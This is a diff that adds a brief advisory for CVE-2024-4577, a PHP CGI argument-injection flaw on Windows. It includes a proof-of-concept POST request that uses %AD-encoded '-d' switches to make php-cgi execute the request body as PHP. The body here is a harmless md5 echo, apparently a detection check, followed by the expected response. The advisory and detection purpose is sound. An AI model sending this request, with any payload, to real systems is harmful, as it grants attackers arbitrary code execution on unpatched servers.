@@ -1,0 +1,23 @@
+CVE-2024-4577: PHP CGI Argument Injection Vulnerability
+
+Severity: Critical (CVSS 9.8)
+Affected Systems: PHP on Windows running in CGI mode (including XAMPP default installs).
+
+Description:
+A vulnerability exists in PHP when used in CGI mode on Windows, where specific character sequences (specifically Best-Fit encoding conversions like %ad) bypass protections against argument injection. An unauthenticated remote attacker can exploit this to inject command line arguments into php-cgi.exe, achieving arbitrary code execution.
+
+Proof of Concept (PoC):
+An attacker sends a POST request to any exposed PHP script or standard endpoint:
+
+POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+Host: target.local
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+<?php echo md5("nuclei-cve-test"); ?>
+
+Expected Response:
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+7b8bb5d70f074dffae668c2ee0b59b58
